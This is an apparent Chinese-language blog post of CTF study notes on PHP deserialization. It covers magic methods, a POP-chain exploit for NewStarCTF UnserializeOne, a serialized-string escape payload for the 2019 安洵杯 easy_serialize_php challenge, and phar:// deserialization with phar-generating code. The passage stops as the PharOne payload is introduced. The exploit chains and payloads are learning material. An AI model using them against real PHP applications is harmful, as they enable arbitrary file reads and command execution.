<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>反序列化学习 | Bubble&#39;s blog</title>

    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
<meta name="viewport" content="width=device-width,minimum-scale=1">
<meta name="description" content="">
<meta name="generator" content="Hugo 0.128.2">


  <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">


<link rel="stylesheet" href="/css/style.css">



<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />

 
  
  
    
      <script async src="https://www.googletagmanager.com/gtag/js?id=your-google-analytics-id"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'your-google-analytics-id');
        }
      </script>
    
  









  </head>

  <body>
    <nav class="navigation">
    
        <a href="/"> <span class="arrow">←</span>Home</a>
    
    <a href="/posts">Archive</a>
    <a href="/tags">Tags</a>
    <a href="/about">About</a>
    <a href="/friend">friend</a>

    

    
        
        
    
</nav>


    <main class="main">
      

<section id="single">
    <h1 class="title">反序列化学习</h1>

    <div class="tip">
        <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">Jan 1, 0001</time>
        <span class="split">
          ·
        </span>
        <span>
          5060 words
        </span>
        <span class="split">
          ·
        </span>
        <span>
          11 minute read
        </span>
    </div>

    
    
        
  


    


    <div class="content">
      <p><strong>魔术方法</strong></p>
<p>__construct() //当一个对象创建时被调用</p>
<p>__destruct() //当一个对象销毁时被调用</p>
<p>__toString() //当一个对象被当作一个字符串使用</p>
<p>__sleep()//在对象在被序列化之前运行</p>
<p>__wakeup() //将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p>
<p>__get() //获得一个类的成员变量时调用</p>
<p>__set() //在尝试给对象的不可访问（如私有或未定义）属性赋值时被自动调用</p>
<p>__invoke() //调用函数的方式调用一个对象时的回应方法</p>
<p>__call() //当调用一个对象中的不能用的方法的时候就会执行这个函数</p>
<p><strong>反序列化漏洞条件</strong>：</p>
<ol>
<li>
<p>代码中有可利用的类，类中有可用的魔术方法</p>
</li>
<li>
<p>unserialize()函数的参数可控</p>
</li>
</ol>
<p><strong>POP链构造</strong></p>
<p><strong>[NewStarCTF 公开赛赛道]UnserializeOne
42</strong></p>
<p>题目源码:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>error_reporting(<span style="color:#666">0</span>);
</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Start</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$name</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">protected</span> <span style="color:#b8860b">$func</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __destruct()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;Welcome to NewStarCTF, &#34;</span><span style="color:#666">.</span><span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">name</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __isset(<span style="color:#b8860b">$var</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        (<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">func</span>)();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Sec</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">private</span> <span style="color:#b8860b">$obj</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">private</span> <span style="color:#b8860b">$var</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __toString()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">-&gt;</span><span style="color:#b44">check</span>(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">var</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">return</span> <span style="color:#b44">&#34;CTFers&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __invoke()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">echo</span> file_get_contents(<span style="color:#b44">&#39;/flag&#39;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Easy</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cla</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __call(<span style="color:#b8860b">$fun</span>, <span style="color:#b8860b">$var</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">cla</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">clone</span> <span style="color:#b8860b">$var</span>[<span style="color:#666">0</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">eeee</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$obj</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __clone()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a2f;font-weight:bold">if</span>(isset(<span style="color:#b8860b">$this</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">-&gt;</span><span style="color:#b44">cmd</span>)){
</span></span><span style="display:flex;"><span>            <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#34;success&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>构造pop链：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Start</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$name</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$func</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Sec</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$obj</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$var</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Easy</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cla</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">eeee</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$obj</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Start();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Sec();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$c</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Easy();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$d</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> eeee();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$e</span> <span style="color:#666">=</span><span style="color:#a2f;font-weight:bold">new</span> Start();
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$f</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Sec();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$a</span><span style="color:#666">-&gt;</span><span style="color:#b44">name</span><span style="color:#666">=</span><span style="color:#b8860b">$b</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">=</span><span style="color:#b8860b">$c</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$b</span><span style="color:#666">-&gt;</span><span style="color:#b44">var</span><span style="color:#666">=</span> <span style="color:#b8860b">$d</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$d</span><span style="color:#666">-&gt;</span><span style="color:#b44">obj</span><span style="color:#666">=</span> <span style="color:#b8860b">$e</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$e</span><span style="color:#666">-&gt;</span><span style="color:#b44">func</span><span style="color:#666">=</span><span style="color:#b8860b">$f</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">echo</span> serialize(<span style="color:#b8860b">$a</span>);
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>post参数就可以看到flag啦~~</p>
<p><p class="markdown-image">
  <img src="/img/26.png" alt="alt text"  />
</p></p>
<p><strong>字符串逃逸</strong></p>
<p><strong>[安洵杯 2019]easy_serialize_php
1</strong></p>
<p>题目源码：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$function</span> <span style="color:#666">=</span> <span style="color:#666">@</span><span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;f&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">function</span> <span style="color:#00a000">filter</span>(<span style="color:#b8860b">$img</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter_arr</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;php&#39;</span>,<span style="color:#b44">&#39;flag&#39;</span>,<span style="color:#b44">&#39;php5&#39;</span>,<span style="color:#b44">&#39;php4&#39;</span>,<span style="color:#b44">&#39;fl1g&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;/&#39;</span><span style="color:#666">.</span>implode(<span style="color:#b44">&#39;|&#39;</span>,<span style="color:#b8860b">$filter_arr</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;/i&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> preg_replace(<span style="color:#b8860b">$filter</span>,<span style="color:#b44">&#39;&#39;</span>,<span style="color:#b8860b">$img</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$_SESSION</span>){
</span></span><span style="display:flex;"><span>    unset(<span style="color:#b8860b">$_SESSION</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#34;user&#34;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;guest&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;function&#39;</span>] <span style="color:#666">=</span> <span style="color:#b8860b">$function</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>extract(<span style="color:#b8860b">$_POST</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span><span style="color:#b8860b">$function</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">echo</span> <span style="color:#b44">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#666">!</span><span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;img_path&#39;</span>]){
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> base64_encode(<span style="color:#b44">&#39;guest_img.png&#39;</span>);
</span></span><span style="display:flex;"><span>}<span style="color:#a2f;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> sha1(base64_encode(<span style="color:#b8860b">$_GET</span>[<span style="color:#b44">&#39;img_path&#39;</span>]));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$serialize_info</span> <span style="color:#666">=</span> filter(serialize(<span style="color:#b8860b">$_SESSION</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$function</span> <span style="color:#666">==</span> <span style="color:#b44">&#39;highlight_file&#39;</span>){
</span></span><span style="display:flex;"><span>    highlight_file(<span style="color:#b44">&#39;index.php&#39;</span>);
</span></span><span style="display:flex;"><span>}<span style="color:#a2f;font-weight:bold">else</span> <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$function</span> <span style="color:#666">==</span> <span style="color:#b44">&#39;phpinfo&#39;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">eval</span>(<span style="color:#b44">&#39;phpinfo();&#39;</span>); <span style="color:#080;font-style:italic">//maybe you can find something in here!
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>}<span style="color:#a2f;font-weight:bold">else</span> <span style="color:#a2f;font-weight:bold">if</span>(<span style="color:#b8860b">$function</span> <span style="color:#666">==</span> <span style="color:#b44">&#39;show_image&#39;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$userinfo</span> <span style="color:#666">=</span> unserialize(<span style="color:#b8860b">$serialize_info</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">echo</span> file_get_contents(base64_decode(<span style="color:#b8860b">$userinfo</span>[<span style="color:#b44">&#39;img&#39;</span>]));
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><p>根据提示传?f=phpinfo可以看到d0g3_f1ag.php</p>
<p><p class="markdown-image">
  <img src="/img/22.png" alt="alt text"  />
</p></p>
<p>要想看到该文件，需要分析源码</p>
<p>要求$userinfo[&lsquo;img&rsquo;]这个变量是个文件，才能利用file_get_contents查看，这个变量是serialize_info反序列化来的，serialize_info又是_SESSION序列化在经过filter函数得来的。又因为$userinfo[&lsquo;img&rsquo;]有img这个键值，<strong>那么_SESSION这个变量里也要有img这个键值。</strong></p>
<p>先看看需要用到的_SESSION值</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#34;user&#34;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;guest&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;function&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;a&#39;</span>;<span style="color:#080;font-style:italic">//对function赋个值
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;ZDBnM19mMWFnLnBocA==&#39;</span>;<span style="color:#080;font-style:italic">//对d0g3_f1ag.php进行编码
</span></span></span></code></pre></div><p>序列化后为</p>
<blockquote>
<p>&ldquo;a:3:{s:4:&ldquo;user&rdquo;;s:5:&ldquo;guest&rdquo;；s:8:&ldquo;function&rdquo;;s:1:&ldquo;a&rdquo;;s:3:&ldquo;img&rdquo;;s:20:&ldquo;ZDBnM19mMWFnLnBocA==&rdquo;;}&rdquo;</p>
</blockquote>
<p>利用filter让字符串逃逸使得__SESSION包含img的键值</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#34;user&#34;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;flagflagflagflagflagflag&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;function&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span>[<span style="color:#b44">&#39;img&#39;</span>] <span style="color:#666">=</span> <span style="color:#b44">&#39;ZDBnM19mMWFnLnBocA==&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">function</span> <span style="color:#00a000">filter</span>(<span style="color:#b8860b">$img</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter_arr</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">array</span>(<span style="color:#b44">&#39;php&#39;</span>,<span style="color:#b44">&#39;flag&#39;</span>,<span style="color:#b44">&#39;php5&#39;</span>,<span style="color:#b44">&#39;php4&#39;</span>,<span style="color:#b44">&#39;fl1g&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$filter</span> <span style="color:#666">=</span> <span style="color:#b44">&#39;/&#39;</span><span style="color:#666">.</span>implode(<span style="color:#b44">&#39;|&#39;</span>,<span style="color:#b8860b">$filter_arr</span>)<span style="color:#666">.</span><span style="color:#b44">&#39;/i&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">return</span> preg_replace(<span style="color:#b8860b">$filter</span>,<span style="color:#b44">&#39;&#39;</span>,<span style="color:#b8860b">$img</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#b8860b">$_SESSION</span><span style="color:#666">=</span>filter(serialize(<span style="color:#b8860b">$_SESSION</span>));
</span></span><span style="display:flex;"><span>var_dump(serialize(<span style="color:#b8860b">$_SESSION</span>));
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>得到</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>string(154) &#34;s:145:&#34;a:3:{s:4:&#34;user&#34;;s:24:&#34;&#34;;s:8:&#34;function&#34;;s:59:&#34;a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}&#34;;&#34;
</span></span></code></pre></div><p>过滤机制使user值变为<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>,img替代function成为第二个参数，后面手动添加一个<code>dd</code>成为第三个参数就可以啦，img成功逃逸！</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:2:&#34;dd&#34;;s:1:&#34;a&#34;;}
</span></span></code></pre></div><p>查看页面源代码发现/d0g3_fllllllag</p>
<p><p class="markdown-image">
  <img src="/img/23.png" alt="alt text"  />
</p></p>
<p>将/d0g3_fllllllag编码后替换原先d0g3_f1ag.php
的码值即可</p>
<p><p class="markdown-image">
  <img src="/img/25.png" alt="alt text"  />
</p></p>
<p>成功得到flag:</p>
<p><p class="markdown-image">
  <img src="/img/24.png" alt="alt text"  />
</p></p>
<p><strong>phar伪协议触发php反序列化</strong></p>
<ol>
<li>phar文件格式</li>
</ol>
<p>phar（PHP Archive）是一种PHP的打包文件格式，它允许将多个PHP文件和其他资源（如图像、样式表等）打包成一个归档文件，类似于Java的jar包。phar文件主要由以下四部分组成：</p>
<ul>
<li>
<p>stub：phar文件的标志，通常以<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>结尾，这是识别phar文件的关键。</p>
</li>
<li>
<p>manifest：存储被压缩文件的属性等信息，这些信息以序列化的形式存储，这是漏洞利用的核心。</p>
</li>
<li>
<p>content：被压缩文件的内容。</p>
</li>
<li>
<p>signature（可选）：签名，放在文件末尾。</p>
</li>
</ul>
<ol start="2">
<li>反序列化漏洞的产生</li>
</ol>
<p>在PHP中，phar文件的metadata（即manifest部分）以序列化的形式存储。当PHP的文件操作函数（如<code>file_get_contents(), include(), require()</code>等）通过<code>phar://伪协议</code>解析phar文件时，会自动触发对manifest字段的序列化字符串进行反序列化操作。如果这些序列化字符串中包含了恶意构造的对象或数据，就可能导致安全漏洞。</p>
<p>生成phar文件的代码如下：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#080;font-style:italic">//实例一个phar对象供后续操作
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//反序列化payload构造
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">TestObject</span> {
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#666">@</span>unlink(<span style="color:#b44">&#34;phar.phar&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//实例一个phar对象供后续操作，后缀名必须为phar
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> Phar(<span style="color:#b44">&#34;phar.phar&#34;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//开始缓冲对phar的写操作 
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">startBuffering</span>();
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//设置识别phar拓展的标识stub，必须以 __HALT_COMPILER(); ?&gt; 结尾
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setStub</span>(<span style="color:#b44">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>); 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//将反序列化的对象放入该文件中
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$o</span> <span style="color:#666">=</span> <span style="color:#a2f;font-weight:bold">new</span> TestObject();
</span></span><span style="display:flex;"><span>    <span style="color:#b8860b">$o</span><span style="color:#666">-&gt;</span><span style="color:#b44">data</span><span style="color:#666">=</span><span style="color:#b44">&#39;i am bmjoker&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//将自定义的归档元数据meta-data存入manifest
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">setMetadata</span>(<span style="color:#b8860b">$o</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">addFromString</span>(<span style="color:#b44">&#34;test.txt&#34;</span>, <span style="color:#b44">&#34;bmjoker&#34;</span>); 
</span></span><span style="display:flex;"><span>    <span style="color:#080;font-style:italic">//停止缓冲对phar的写操作
</span></span></span><span style="display:flex;"><span><span style="color:#080;font-style:italic"></span>    <span style="color:#b8860b">$phar</span><span style="color:#666">-&gt;</span><span style="color:#b44">stopBuffering</span>();
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>注意:本地生成一个phar文件，要想使用Phar类里的方法，必须将php.ini文件中的<code>phar.readonly</code>配置项配置为0或Off</p>
<p><strong>PharOne</strong></p>
<p>开启环境发现了文件上传页面
<p class="markdown-image">
  <img src="/img/31.png" alt="alt text"  />
</p></p>
<p>查看页面源代码发现class.php,于是访问得到以下代码：</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#666">&lt;?</span>php
</span></span><span style="display:flex;"><span>highlight_file(<span style="color:#800">__FILE__</span>);
</span></span><span style="display:flex;"><span><span style="color:#a2f;font-weight:bold">class</span> <span style="color:#00f">Flag</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#b8860b">$cmd</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a2f;font-weight:bold">public</span> <span style="color:#a2f;font-weight:bold">function</span> __destruct() {
</span></span><span style="display:flex;"><span>        <span style="color:#666">@</span>exec(<span style="color:#b8860b">$this</span><span style="color:#666">-</span>cmd);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#666">@</span>unlink(<span style="color:#b8860b">$_POST</span>[<span style="color:#b44">&#39;file&#39;</span>]);
</span></span><span style="display:flex;"><span><span style="color:#080">?&gt;</span><span style="">
</span></span></span></code></pre></div><p>文件上传考虑phar反序列化，构造以下payload：</p>
